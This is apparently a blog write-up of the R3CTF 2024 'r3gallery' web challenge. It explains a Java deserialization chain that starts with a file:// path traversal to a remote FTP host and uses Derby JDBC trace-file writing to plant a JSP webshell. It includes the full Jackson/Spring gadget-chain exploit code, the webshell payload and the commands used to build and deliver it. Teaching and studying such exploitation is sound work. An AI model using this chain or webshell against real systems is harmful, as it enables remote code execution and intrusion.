---

layout: post

title: "R3CTF - r3gallery Writeup"

date: 2024-06-28

tag-name: java deserialization

---



Challenge Author: to016

## Overview

The challenge is pretty simple. When we connect to the challenge page, a simple web page is presented. The web page mimics the front page of an art gallery, but there is not so much to click on it.

By looking at the network connections in the devtools we discover that the page is sending some network requests to `gallery/api/decompress?path=`

Interesting. Seems like that there is an endpoint that <mark style="background: #FFB86CA6;">decompress</mark> some images. Let's look at it in the source code.

Unfortunately, this is not that easy.

### So Long Apache Tomcat

The challenge's attachment is a zip file that contains all the file necessary to perform a self deployment.

```
.
├── docker-compose.yml
└── web/
    ├── Dockerfile
    ├── flag
    ├── heavy_images/
    ├── java.security
    ├── readflag
    └── src/
        ├── apache-tomcat-9.0.89.zip
        ├── gallery.war
        └── jdk-15.0.2
```

As you can see, there is a Tomcat web server where the `.war` file is deployed. Fortunately for us the `.war` file is similar to a zip file, so we can easily extract it in order to get access to the sources.

We can extract the `gallery.war` archive with a simple `unzip gallery.war`  or with `jar -xvf gallery.war`  

After the extraction process, out directory structure will look like this. Notice that i've stripped the aforementioned files for brevity.

```
.
└── web/
    ├── src/
    │   ├── WEB-INF/
    │   │   ├── classes/
    │   │   │   └── com/
    │   │   │       └── gallery/
    │   │   │           └── art/
    │   │   │               ├── contorllers/
    │   │   │               │   ├── ApiController.class
    │   │   │               │   └── IndexController.class
    │   │   │               ├── models/
    │   │   │               │   └── ImageBean.class
    │   │   │               ├── tools/
    │   │   │               │   ├── CustomDataSource.class
    │   │   │               │   ├── PathUtils.class
    │   │   │               │   └── PendingDataSource.class
    │   │   │               └── ArtGalleryApplication.class
    │   │   └── lib/
    │   │       └── ...

```

As you may notice, we don't have `.java` files. Again is simple to retrieve those from the compiled `.class` files (fortunately).

We can use the `jadx` decompiler, in order to perform this operation. Below there is a quick bash command that let you decompile these files.

```bash
cd ./web/src/
find ./WEB-INF/classes/com/galery/art/ -type f -exec find {} -type f -name "*.class" \; | xargs -I ! jadx -d decompiled ! --comments-level none 
```

The output of this command is a directory containing all the decompiled `.java` files, which now we can analyze.

## Java Challenge Means Deserialization

By looking at the source code, we can analyze the route for decompressing files, since it seems interesting.

```java
@RequestMapping({"/api"})
@RestController
public class ApiController {
    @GetMapping({"/decompress"})
    public byte[] index(String path) {
        try {
            String processedPath = PathUtils.canonicalPath("file:///heavy_images/" + path);
            if (processedPath == null || !processedPath.startsWith("file://")) {
                return "Invalid".getBytes(StandardCharsets.UTF_8);
            }
            FileUrlResource fileUrlResource = new FileUrlResource(new URL(processedPath));
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(fileUrlResource.getInputStream().readAllBytes());
            InputStream is = new GZIPInputStream(byteArrayInputStream);
            ObjectInputStream sois = new ObjectInputStream(is);
            try {
                ImageBean image = (ImageBean) sois.readObject();
                byte[] returnData = image.getContent();
                sois.close();
                return returnData;
            } catch (Exception e) {
                return "Error occurred".getBytes();
            }
        } catch (UnsupportedEncodingException var10) {
            var10.printStackTrace();
            return null;
        } catch (IOException var11) {
            var11.printStackTrace();
            return null;
        }
    }
}
```

This routes does the following:

- Concatenates a `path` parameter to `file:///heavy_images/`
- Checks if the processed path starts with `file://`
- If it's true, read all bytes from the stream and unzip it with gzip
- The decompressed file is then converted to an object, and the `readObject` method is called

Really interesting! The route is essentially performing <mark style="background: #FFB86CA6;">deserialization</mark> of an object. The problem is that we can technically hit any path that we want due to a trivial path traversal, but we don't have full control on the deserialized object.

Or can we?

## Fallbacking? More like back falling

Think about it really careful.  The check is performed just on `file://` and not on `file:///`. After thinking about it i've started read the specification for the [file URI](https://datatracker.ietf.org/doc/rfc8089/) and the wikipedia related page.

Turns out that using `file:///` is the same as using `file://localhost/`. So essentially is fallbacking to localhost. This means that we can specify a remote host in order to retrieve a file from it.
In the specification is also stated that the file URI can be used to instantiate remote connections to hosts.
Personally i found this behaviour mind blowing. I didn't know of this behaviour, and it's wonderful to have learnt about it, even though seems like some really old behaviour.

Back to our challenge, we can traverse the path back to the beginning of the URI just by using `../../ip:port/file`
At this point we can import an arbitrary object that later on will be deserialized. It's time to achieve RCE.

## JDBC and Apache Derby

Here is where the things are getting more interesting. I've always been thrilled by these kind of challenges, where do you need to find the gadgets. Even though this blogpost is another story of a reverse engineered exploit, i've learned a lot.

Let's star with analyzing the source code once again. We can deserialize an arbitrary object, so we need to chain objects in order to reach our goal, which is RCE.

Reading the code once again we can find this:

```java
import java.sql.DriverManager;
import java.sql.SQLException;
import org.apache.derby.jdbc.ClientDriver;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;

@SpringBootApplication
public class ArtGaleryApplication extends SpringBootServletInitializer {
    static {
        try {
            DriverManager.registerDriver(new ClientDriver());
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }
    }

    public static void main(String[] args) {
        SpringApplication.run(ArtGaleryApplication.class, args);
    }

    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {
        return builder.sources(new Class[]{ArtGaleryApplication.class});
    }
}
```

In the main file is registered a JDBC driver for <mark style="background: #FFB86CA6;">Apache Derby</mark>. The weird thing is that there is no derby server on the application. So this should be here for a reason.

Among the other custom classes, there is another interesting class. The class is `CustomDataSource` and implements the `Serializable` interface.

```java
public class CustomDataSource implements PendingDataSource, Serializable {
    String conStr;

    public Connection getConnection() throws SQLException {
        DriverManager.getConnection(this.conStr);
        return null;
    }

    public String getConStr() {
        return this.conStr;
    }

    public int getLoginTimeout() {
        return 1;
    }

    public ConnectionBuilder getConnectionBuilder() throws SQLException {
        throw new SQLFeatureNotSupportedException("createConnectionBuilder not implemented");
    }
}
```

The only useful method is `getConnection` which uses the `DriverManager.getConnection` method in order to instantiate a connection to a database, using JDBC. 
Again this class is never used, so the things are getting interesting.

At this point there are two things that we have discovered:

- We can deserialize a `CustomDataSource` object, but it does not implement any `readObject` method
- We have a register JDBC driver for Apache Derby. This allows us to connect with a non existent Derby server

Sounds pretty useless right? We need to gather more information. After spending a bit of time through the Derby docs, you can find this [page](https://db.apache.org/derby/docs/10.4/devguide/cdevdvlp17453.html).

There is defined the syntax used to connect to a Derby server via JDBC. Surprisingly we [discover](https://db.apache.org/derby/docs/10.10/ref/rrefattrib24612.html#rrefattrib24612) that we can customize the behaviour of the connection by appending some <mark style="background: #FFB86CA6;">attributes</mark> to the URL.

Skimming through those, there are a couple of outstanding ones:

- `create=true` allows the creation of the database
- `traceFile=path` allows the creation of a file within will be logged the output
- `traceLevel=value` allows to specify how much will be logged

Essentially during the connection to the database, if we specify those parameters, a file will be created with some logging information. 
Due to the fact that the Derby Server does not exists the connection will be shortly after dropped, but the <mark style="background: #FFB86CA6;">file will be created</mark> regardless.

If our connection information will be logged, we can theoretically embed a <mark style="background: #FFB86CA6;">webshell</mark> into our connection string. Thus will be logged and saved into the log file, leading to RCE.

Indeed this is working. Using something like the following we can create a `.jsp` that executes system commands.

```python
jdbc:derby://127.0.0.1:8080/tmp/myderby;create=true;traceFile=/path_to_tomcat/webapps/gallery/exploit.jsp;traceLevel=35;<%out.write(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"id\"}).getInputStream())).readLine())\\u003b%>=z
```

Credits for this payload goes to <mark style="background: #FFB86CA6;">@null001</mark>. It's a really clever technique and it's indeed powerful. 

## The art of chaining

Right now, we know that we can achieve RCE via Arbitrary Write. The next step is understand how to trigger the `getConnection` method, from the `CustomDataSource` class, with our payload.

Essentially starting from a `readObject` method we need to land on a `get` method. We need what is called, in literature, a <mark style="background: #FFB86CA6;">kick-off</mark> gadget.
After a bit of time of googling some stuff, i've came across [this repository](https://github.com/LxxxSec/CTF-Java-Gadget). In it there are a lot of useful gadgets, and after reading a bit of it i've found how we reach the getter method.

I haven't found a direct way to reach the getter method starting from the `readObject`, so we need actually two different gadgets:

- The first one will call our getter method, by calling a `toString`
- The second one will call the `toString` method, by calling the `readObject` method (the kick-off gadget)

As you can see we have constructed a chain of gadget that lead us to call the getter method.

I've tried to make the process as clean as possible, but was not easy for me to came up with such idea. I've spent countless of hours in order to understand how the two gadgets were working. After that my first exploit wasn't working due to some reason that are still a bit obscure right now.

I've always been thrilled by such challenges, mainly by the fact that there are not so much resources in English regarding gadget finding. I've spent a lot of hours translating blog posts and writeups from Chinese. That's why i'm still investing my time on it, because i think that have some English resources could be really helpful to someone.

Back to the challenge, after a bit of copy and pasting the gadgets from the repo and reversing the author exploit (thank you @to016 for dealing with me), I've came up with a fully working exploit.

```java
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import java.io.*;
import java.lang.reflect.*;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import org.springframework.aop.target.HotSwappableTargetSource;
import com.galery.art.tools.CustomDataSource;
import com.galery.art.tools.PendingDataSource;
import org.springframework.aop.framework.AdvisedSupport;

public class Main{
    public static void main(String[] args) throws Exception{

        /**
         * We know that we can reach a getter method starting from a readObject.
         * The adopted technique is the following.
         * Using POJONode we can call a getter method using a toString.
         * Using <insert> we can call a toString method from a readObject.
         * In this way we have created a gadget chain.
         * 
         * Let's start by creating the first part of the gadget chain. POJONode#toString -> getter
         * We leverage the use of javassist in order to work with java bytecode properly.
         * We remove the writeReplace method in order to have a properly working gadget.
         * In this way we remove an exception that obstacles us.
         * 
         * */ 

	    ClassPool pool = ClassPool.getDefault();
	    pool.appendClassPath("/<path-to-lib>/jackson-databind-2.13.5.jar");
	    CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        ctClass0.toClass(classLoader, null);


        /**
         * Let's now create the class on which we want to call the getter method.
         * With the setFieldValue method we set the conStr field with our payload.
         * The payload instanties a connection to a derby server (which doesn't exists in our case).
         * We can leverage the usage of attributes for the connection in order to create a log file.
         * The parameter is traceFile.
         * In this log file there will be our webshell. How? By simply adding it after the connection.
         * This will be simply logged to the file.
         * 
         * There is just one caveat. We need to adjust the log tracing level in order to reduce the amount of junk outputted to the log file.
         * After trying and error, it's ok to have an error tracing level around 32 to 35
         *  
         * */ 

        CustomDataSource getterClass = new CustomDataSource();
        setFieldValue(getterClass,"conStr","jdbc:derby://127.0.0.1:8080/tmp/myderby;create=true;traceFile=/<path-to-tomcat>/webapps/gallery/exploit.jsp;traceLevel=35;<%out.write(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"id\"}).getInputStream())).readLine())\\u003b%>=zz");

        /**
         *  We can now create our POJONode class with our getterClass embedded.
         *  We need to wrap the getterClass around a Proxy. This gadget is called JacksonReadObject2GetterBetter.
         *  The standard gadget is not working, due to some exception being thrown.
         * 
         * */ 

	    POJONode toStringClass = new POJONode(makeTemplatesImplAopProxy(getterClass));

        /**
         * Now we have a fully working chain from a toString method to a getter method.
         * We need to build the rest of the chain.
         * At the beginning i thought about using BadAttributeValueExpException#readObject -> toString gadget.
         * However this is no longer possible to use due to the JDK not allowing it.
         * 
         * I've tried also with EventListenerList#readObject -> toString but even that was not working due to some corruption.
         * 
         * So the final gadget used is HashMap#readObject -> HotSwappableTargetSource#equals -> XString#equals -> toString.
         * Which is a bit longer but it's indeed working.
         * 
         */


        // We cannot instantiate XString here due to some road blocks. We can find this workaround however.
        Class cls = Class.forName("com.sun.org.apache.xpath.internal.objects.XString");
        Constructor constructor = cls.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);

        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(toStringClass);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(constructor.newInstance("1"));
        HashMap hashMap = makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);

        FileOutputStream fos = new FileOutputStream("exploit.bin");
        GZIPOutputStream gzipOS = new GZIPOutputStream(fos);
        ObjectOutputStream oos = new ObjectOutputStream(gzipOS);
        oos.writeObject(hashMap);
        oos.close();
    }

    public static Object makeTemplatesImplAopProxy(CustomDataSource templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{PendingDataSource.class}, handler);
        return proxy;
    }

    public static HashMap<Object, Object> makeMap(Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
}
```


You can compile and run this exploit with the following command. You must be sure however to have all the necessary library downloaded on your system. Even though the 95% of them are already provided with the challenge, we need `javassist` to help us developing the exploit.

```bash
javac -cp ".:<path-to-lib-folder-of-challenge>/*:/<path-to-your-downloaded-jar>/*" Main.java
java -cp ".:<path-to-lib-folder-of-challenge>/*:/<path-to-your-downloaded-jar>/*" Main
```

Now you just need to launch a simple FTP server and retrieve the file from there. I've used the following in order to create one.

```bash
python3 -m pyftpdlib -p 21 -w --user= --password=
```

Just sending a request to `http://challenge-url/gallery/api/decompress?path=../../ip:port/exploit.bin` is enough to download the file and trigger the deserialization process.

Even if it will fail, our webshell will be created. We can just navigate to `http://challenge-url/gallery/exploit.jsp` and notice the output of the `id` command

## Appendix A - Java Debugging

I would like to spend a couple of words regarding how to debug this specific challenge. 

The very first thing that you have to do is to move the `gallery.war` file into the `webapps` directory of Apache Tomcat.  

Then, we need to enable the debug on Tomcat. We can do that by simply editing the `catalina.sh` file, which is located into the `bin` directory of Apache Tomcat, adding the following line

```bash
CATALINA_OPTS="-Xdebug  -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8089"
```

After that we can just run the `setup.sh` script on the same directory. This will not only enable the debug on Tomcat, but also deploy the `.war` file. 
Pretty easy, isn't it? It took me only <mark style="background: #FFB86CA6;">3 hours</mark> just to figure it out.

Now, wouldn't be beautiful if we can debug our code by clearly seeing every instruction and debugging every try of our exploit to understand <mark style="background: #FFB86CA6;">what the fuck</mark> is happening?

So, let's open Intellij IDEA (i'm sorry i don't know how to do it in Eclipse). If you have already unzipped the `gallery.war` file you can open an already existing project and choose the `web` folder.

Now you need to edit the run configuration. We need to do this in order to perform the Remote Debugging.
Just click to open the main file, which is `ArtGaleryApplication.class` and click, on the upper tab, on `Current File` to expand it. You should now click on `Edit Configurations`

![Image 1](/images/r3ctf-2024/first.png)

You can click on the plus sing, on the upper left corner, to add a configuration. Among all the options you must select `Remote JVM Debug`. You can now modify the port to match the one used into the `catalina.sh` file, which is the `8089`. 
Moreover it's important to select `<no module>` in the `Use module classpath` option.
You can now click on `Apply`. We are not yet ready to debug our application, but we are really close.

You must add the libraries to the project structure. So let's just navigate to `File > Project Structure`. In there you need to click on `Libraries` and then on the first plus symbol on the left and then on `Java`.

![Image 2](/images/r3ctf-2024/second.png)

From there you need to select the `src/WEB-INF/classes` folder in order to import the custom classes. You should repeat those steps also for the `src/WEB-INF/lib`.

I hope everything is clear, it took me 5 hours to understand how in the world i can do such things. I've combined together different Chinese guides to proper understand how to do it, but in the end is working. 

Now you can just set a breakpoint whenever you want and launch the remote debugger using the green button with the bug in it. You can step into, step over and do whatever is useful for you in order to understand the whole process.

## The End

Java security is pretty awesome in my opinion. There are a lot of interesting things in there, and several attacks that are starting to interesting me. I don't know if those things are outdated, or deserialization bugs are dead nowadays. I just find interesting to find new gadgets and bypasses, so i'll do it regardless. 

I've found a lot of resources in Chinese, and i've got really hard time to understand how the exploit chain was working due to debugging issues.

I would like to thank really much @to016 for creating this challenge, and as always for dealing with me during all my annoying questions.






